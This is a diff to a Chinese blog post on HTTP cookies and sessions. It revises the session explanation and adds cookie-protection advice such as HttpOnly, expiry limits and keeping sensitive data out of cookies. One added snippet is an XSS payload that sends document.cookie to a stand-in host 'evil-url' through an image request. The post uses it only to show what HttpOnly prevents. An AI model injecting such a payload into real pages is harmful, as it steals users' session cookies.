@@ -17,7 +17,7 @@ HTTP cookie 是当用户访问网页时，由服务端给客户端发送并存�
 
 ## cookie 几个重要属性
 
-![cookie 几个重要属性](https://github.com/eminoda/myBlog/blob/master/imgs/js_base/cookie.png?raw=true)
+![cookie 几个重要属性](https://github.com/eminoda/myBlog/blob/master/imgs/js_base/cookies.png?raw=true)
 
 
 ### Domain 和 Path
@@ -65,11 +65,11 @@ ctx.cookies.set('name', 'tobi', {
 
 ## session
 
-与 cookie 不同，前者存放在客户端，后者是记录于浏览器内存中的。 session 是和服务端一同“配合”让数据持久化的技术方案，都是解决 http 无状态这类问题。
+与 cookie 不同，前者存放在客户端，后者是服务器生成并记录于浏览器（内存）中的，也就是常说的 session cookie，在浏览器关闭后销毁。 session 是和服务端一同“配合”让数据持久化的技术方案，都是解决 http 无状态这类问题。
 
-服务端向客户端浏览器丢个 sessionId （比如，Tomcat 里的 JESSIONID），每次 http 请求，都会把当前会话的 sessionId 传给服务端，从而处理实际的业务问题。
+服务端向客户端浏览器丢个 sessionId （比如，Tomcat 里的 JESSIONID），每次 http 请求，都会把当前会话的 sessionId 传给服务端，服务端校验自己生成的 sessionId 和客户端的 sessionId 做比对来实现业务校验功能。
 
-当然浏览器关闭后，session 域保存的东西就没有了。
+当然浏览器关闭后，本地 session 域保存的东西就没有了，但服务器生成的 sessionId 过期时间取决于服务器设置的保存时间。
 
 ## 怎么通过 js 获取 cookie
 
@@ -94,15 +94,26 @@ while(result){
 ## cookie 的保护
 
 ### 属性入手
-对于设置 cookie 几个属性，当然不要忽略 Secure and HttpOnly 这两个属性
+对于设置 cookie 几个属性，当然不要忽略 Secure and HttpOnly 这两个属性。
+
+比如设置 HttpOnly，就能在 xss 攻击上起到效果。
+
+````js
+var img = document.createElement('img');
+img.src = 'http://evil-url?c=' + encodeURIComponent(document.cookie); // 获取不到 cookie
+document.getElementsByTagName('body')[0].appendChild(img);
+````
 
 ### 不要永久缓存
-对每个 cookie 设置符合业务需求的过期时间
+对每个 cookie 设置符合业务需求的过期时间，同时服务端要有个主动清除 cookie 的逻辑功能，以便万不得已下线所有用户，重新请求 cookie 信息。
 
 ### 加密
 通常我们不会对 cookie 信息进行加密，但既然是本地数据就很容易被人模拟。
 
 为了增加网站安全，可以的话做点 Token 机制的安全手段
+
+### 不要放敏感的信息
+该从数据库查的还是查下，安全性上不要吝啬性能消耗。cookie 尽量不要放敏感信息，密码等数据。
 
 ## 怎么查看 Chrome 的 Cookie？
 
@@ -136,3 +147,4 @@ while(result){
 - [SQLite 简介](https://www.runoob.com/sqlite/sqlite-intro.html)
 - [SQLite 安装](https://www.runoob.com/sqlite/sqlite-installation.html)
 - [Set-Cookie MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
+- [Cookie 与 Cookie劫持](https://g2ex.github.io/2015/06/29/Cookie-and-Cookie-Injection/)
